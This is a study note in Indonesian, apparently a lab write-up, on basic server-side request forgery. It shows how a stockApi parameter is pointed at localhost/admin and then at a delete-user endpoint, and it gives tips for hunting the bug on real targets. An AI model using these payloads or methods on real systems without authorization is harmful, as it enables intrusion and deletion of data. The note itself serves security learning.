# Basic SSRF Against Localhost

## Konsep

SSRF = server melakukan request ke URL yang dikontrol attacker.

Normal:

```
user → server → stock API
```

Bug:

```
user → server → URL attacker-controlled
```

## Inti bug

> Parameter `stockApi` bisa dikontrol attacker sehingga server dapat
> dipaksa melakukan request ke resource internal.

## Exploit

Normal:

```
stockApi=http://stock-api/...
```

Ubah menjadi:

```
stockApi=http://localhost/admin
```

Server yang melakukan request:

```
attacker
   ↓
stockApi
   ↓
target server
   ↓
localhost/admin
```

Hasilnya, attacker bisa membaca response dari admin interface yang tidak
bisa diakses secara langsung.

## Final Exploit

Dari `/admin`, cari endpoint untuk menghapus user:

```
/admin/delete?username=carlos
```

Kemudian:

```
stockApi=http://localhost/admin/delete?username=carlos
```

Server melakukan request tersebut sehingga user `carlos` terhapus.

## Real World

Di real hunting, jangan cuma mencari:

```
localhost/admin
```

Cari **fitur yang melakukan server-side fetch**, misalnya:

```
webhook
URL import
image fetcher
PDF generator
URL preview
callback
API tester
feed/RSS importer
```

Parameter juga tidak harus bernama `url`.

Contoh:

```
url=
uri=
endpoint=
callback=
webhook=
target=
destination=
source=
imageUrl=
redirect=
```

## Cara Hunting

```
Cari server-side fetch
      ↓
Buktikan server benar-benar request
      ↓
Pahami validasi URL
      ↓
Cek apakah internal network bisa dijangkau
      ↓
Cari internal service
      ↓
Cari sensitive endpoint/data
      ↓
Buktikan impact
```

## Jangan Terpaku localhost

Kalau:

```
http://localhost/admin
```

tidak berhasil, bukan berarti SSRF tidak ada.

Bisa saja:

```
SSRF sink ada
↓
localhost diblokir
↓
destination lain masih dapat dijangkau
```

Fokus pada:

```
internal hostname
private network
internal API
admin service
cloud/internal infrastructure
```

## Response yang Perlu Diperhatikan

```
200 → request kemungkinan berhasil
403 → resource mungkin tercapai tetapi ditolak
404 → host/path mungkin berbeda
500 → downstream request/error perlu dianalisis
timeout → koneksi mungkin sedang dicoba tetapi tidak mendapat response
```

Jangan hanya melihat status code. Perhatikan juga response body,
response length, timing, redirect, dan error message.

## Real Hunting Note

> SSRF di real target tidak harus menghasilkan `localhost/admin`.

Yang penting adalah:

```
user-controlled URL
      ↓
server-side request
      ↓
unexpected destination
      ↓
internal resource
      ↓
security impact
```

## Hafalan

```
URL dikontrol user
      ↓
server melakukan fetch
      ↓
destination bisa dimanipulasi
      ↓
akses internal resource
      ↓
cari security impact
```
